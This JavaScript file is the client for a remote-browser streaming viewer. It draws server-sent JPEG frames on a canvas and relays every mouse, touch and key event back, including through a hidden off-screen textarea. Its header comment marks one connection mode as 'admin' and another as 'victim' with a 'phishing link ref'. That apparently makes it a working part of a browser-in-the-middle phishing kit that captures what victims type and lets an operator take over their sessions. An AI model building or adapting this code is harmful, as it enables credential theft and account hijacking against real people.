// Vanilla viewer client. No framework, no build step.
//
//   const v = new SocialPanelViewer(canvasEl);
//   v.connect('accountId');           // admin (uses session cookie)
//   v.connect('accountId', ref);      // victim (ref = phishing link ref)
//   v.disconnect();

class SocialPanelViewer {
  constructor(canvas) {
    this.canvas = canvas;
    this.ctx    = canvas.getContext('2d');
    this.ctx.imageSmoothingEnabled = true;
    this.ctx.imageSmoothingQuality = 'high';
    this.ws     = null;
    this._bound = [];
    this._pendingMouse = null;  // throttle mousemove
    this._rafId = null;
  }

  connect(accountId, ref) {
    this.disconnect();
    const proto    = location.protocol === 'https:' ? 'wss' : 'ws';
    const refParam = ref ? `?ref=${encodeURIComponent(ref)}` : '';
    const ws = new WebSocket(
      `${proto}://${location.host}/api/accounts/${encodeURIComponent(accountId)}/viewer${refParam}`
    );
    this.ws = ws;

    ws.binaryType = 'arraybuffer';

    ws.onmessage = (ev) => {
      let msg;
      try { msg = JSON.parse(ev.data); } catch { return; }
      if (msg.t === 'frame') this._drawFrame(msg.data);
    };
    ws.onclose = (ev) => { if (this.onclose) this.onclose(ev); };
    ws.onopen  = () => { this._attachInput(); this._sendSize(); if (this.onopen) this.onopen(); };
  }

  // Decode JPEG via createImageBitmap (off-main-thread where supported) and draw to canvas.
  _drawFrame(b64) {
    const bin = atob(b64);
    const arr = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    const blob = new Blob([arr], { type: 'image/jpeg' });

    createImageBitmap(blob).then((bmp) => {
      if (this.canvas.width  !== bmp.width)  this.canvas.width  = bmp.width;
      if (this.canvas.height !== bmp.height) this.canvas.height = bmp.height;
      this.ctx.drawImage(bmp, 0, 0);
      bmp.close();
      this._frameDrawn();
    }).catch(() => {
      // Fallback: Image element
      const img = new Image();
      img.onload = () => {
        if (this.canvas.width  !== img.naturalWidth)  this.canvas.width  = img.naturalWidth;
        if (this.canvas.height !== img.naturalHeight) this.canvas.height = img.naturalHeight;
        this.ctx.drawImage(img, 0, 0);
        URL.revokeObjectURL(img.src);
        this._frameDrawn();
      };
      img.src = URL.createObjectURL(blob);
    });
  }

  _frameDrawn() {
    this._frameCount = (this._frameCount || 0) + 1;
    // Skip the very first frame or two: they land before our resize request
    // reaches the server, so they're still the launch-time default size.
    // Waiting one extra frame avoids flashing that wrong size on screen.
    if (this._frameCount === 2 && this.onReady) this.onReady();
  }

  _sendSize() {
    const box = this.canvas.parentElement?.getBoundingClientRect()
             || this.canvas.getBoundingClientRect();
    if (!box.width || !box.height) return;
    const width = Math.round(box.width);
    const height = Math.round(box.height);
    // Skip near-identical resizes (scrollbar flicker, sub-pixel reflow) to
    // avoid repeatedly restarting the remote screencast.
    const last = this._lastSize;
    if (last && Math.abs(last.width - width) < 24 && Math.abs(last.height - height) < 24) return;
    this._lastSize = { width, height };
    this._send({ t: 'resize', width, height, dpr: window.devicePixelRatio || 1 });
  }

  disconnect() {
    this._detachInput();
    if (this._rafId) { cancelAnimationFrame(this._rafId); this._rafId = null; }
    if (this.ws) { try { this.ws.close(); } catch {} this.ws = null; }
  }

  _send(obj) {
    if (this.ws?.readyState === WebSocket.OPEN) this.ws.send(JSON.stringify(obj));
  }

  _coords(e) {
    const r  = this.canvas.getBoundingClientRect();
    const sx = this.canvas.width  / r.width;
    const sy = this.canvas.height / r.height;
    return {
      x: Math.round((e.clientX - r.left) * sx),
      y: Math.round((e.clientY - r.top)  * sy),
    };
  }

  _modifiers(e) {
    return (e.altKey ? 1 : 0) | (e.ctrlKey ? 2 : 0) | (e.metaKey ? 4 : 0) | (e.shiftKey ? 8 : 0);
  }
  _button(e)      { return ['left','middle','right'][e.button] || 'left'; }
  _buttonsMask(e) { return (e.buttons&1?1:0)|(e.buttons&2?2:0)|(e.buttons&4?4:0); }

  _attachInput() {
    const cv = this.canvas;
    cv.tabIndex = 0;
    cv.style.touchAction = 'none';

    // Hidden textarea for mobile keyboard — positioned off-screen but focusable
    if (!this._mobileInput) {
      const ta = document.createElement('textarea');
      ta.style.cssText = 'position:fixed;left:-9999px;top:50%;width:1px;height:1px;opacity:0;font-size:16px;';
      ta.autocomplete = 'off';
      ta.autocorrect = 'off';
      ta.autocapitalize = 'off';
      ta.spellcheck = false;
      document.body.appendChild(ta);
      this._mobileInput = ta;
    }
    const ta = this._mobileInput;

    const on = (t, type, fn, opts) => {
      t.addEventListener(type, fn, opts);
      this._bound.push([t, type, fn, opts]);
    };

    // Forward textarea input as key events to remote browser
    on(ta, 'input', (e) => {
      const val = ta.value;
      if (!val) return;
      for (const ch of val) {
        this._send({ t: 'key', type: 'keyDown', key: ch, code: '', keyCode: ch.charCodeAt(0), text: ch });
        this._send({ t: 'key', type: 'keyUp',   key: ch, code: '', keyCode: ch.charCodeAt(0) });
      }
      ta.value = '';
    });

    // Throttled mousemove via rAF
    on(cv, 'mousemove', (e) => {
      const { x, y } = this._coords(e);
      this._pendingMouse = { t:'mouse', type:'mouseMoved', x, y, buttons: this._buttonsMask(e), modifiers: this._modifiers(e) };
      if (!this._rafId) {
        this._rafId = requestAnimationFrame(() => {
          this._rafId = null;
          if (this._pendingMouse) { this._send(this._pendingMouse); this._pendingMouse = null; }
        });
      }
    });

    on(cv, 'mousedown', (e) => {
      e.preventDefault(); cv.focus();
      // On mobile: focus hidden textarea to trigger keyboard
      if (navigator.maxTouchPoints > 0) { ta.focus({ preventScroll: true }); }
      const { x, y } = this._coords(e);
      this._send({ t:'mouse', type:'mousePressed', x, y, button: this._button(e), buttons: this._buttonsMask(e), clickCount: e.detail||1, modifiers: this._modifiers(e) });
    });
    on(cv, 'mouseup', (e) => {
      e.preventDefault();
      const { x, y } = this._coords(e);
      this._send({ t:'mouse', type:'mouseReleased', x, y, button: this._button(e), buttons: this._buttonsMask(e), clickCount: e.detail||1, modifiers: this._modifiers(e) });
    });

    // Touch tap → focus hidden textarea (mobile keyboard)
    on(cv, 'touchstart', (e) => {
      ta.focus({ preventScroll: true });
      const t = e.touches[0];
      const { x, y } = this._coords(t);
      this._send({ t:'mouse', type:'mousePressed', x, y, button:'left', buttons:1, clickCount:1, modifiers:0 });
    }, { passive: true });
    on(cv, 'touchend', (e) => {
      const t = e.changedTouches[0];
      const { x, y } = this._coords(t);
      this._send({ t:'mouse', type:'mouseReleased', x, y, button:'left', buttons:0, clickCount:1, modifiers:0 });
    }, { passive: true });

    let resizeTimer;
    on(window, 'resize', () => { clearTimeout(resizeTimer); resizeTimer = setTimeout(() => this._sendSize(), 400); });
    on(cv, 'contextmenu', (e) => e.preventDefault());
    on(cv, 'wheel', (e) => {
      e.preventDefault();
      const { x, y } = this._coords(e);
      this._send({ t:'mouse', type:'mouseWheel', x, y, deltaX: -e.deltaX, deltaY: -e.deltaY, modifiers: this._modifiers(e) });
    }, { passive: false });

    const keyEvent = (type) => (e) => {
      e.preventDefault();
      const printable = type === 'keyDown' && e.key.length === 1;
      this._send({ t:'key', type: printable ? 'keyDown' : type, key: e.key, code: e.code, keyCode: e.keyCode, text: printable ? e.key : undefined, modifiers: this._modifiers(e) });
    };
    on(cv, 'keydown', keyEvent('keyDown'));
    on(cv, 'keyup',   keyEvent('keyUp'));
  }

  _detachInput() {
    for (const [t, type, fn, opts] of this._bound) t.removeEventListener(type, fn, opts);
    this._bound = [];
    if (this._mobileInput) { this._mobileInput.remove(); this._mobileInput = null; }
  }
}

window.SocialPanelViewer = SocialPanelViewer;
